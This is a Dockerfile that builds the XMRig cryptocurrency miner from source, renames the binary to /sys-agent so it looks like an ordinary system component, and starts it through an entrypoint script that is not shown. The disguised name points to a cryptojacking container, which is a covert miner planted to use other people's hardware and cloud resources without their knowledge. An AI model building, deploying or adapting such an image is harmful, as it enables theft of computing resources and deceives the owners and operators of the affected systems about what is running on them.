FROM debian:bullseye-slim

# Install dependencies
RUN apt-get update && apt-get install -y \
  build-essential cmake git automake libtool autoconf \
  libhwloc-dev libuv1-dev libssl-dev && \
  rm -rf /var/lib/apt/lists/*

RUN git clone https://github.com/xmrig/xmrig.git && \
  mkdir xmrig/build && cd xmrig/build && \
  cmake .. && make -j$(nproc) && \
  mv xmrig /sys-agent && \
  chmod +x /sys-agent

# Copy entrypoint
COPY entrypoint.sh /entrypoint.sh
RUN chmod +x /entrypoint.sh

# Run entrypoint
CMD ["/entrypoint.sh"]
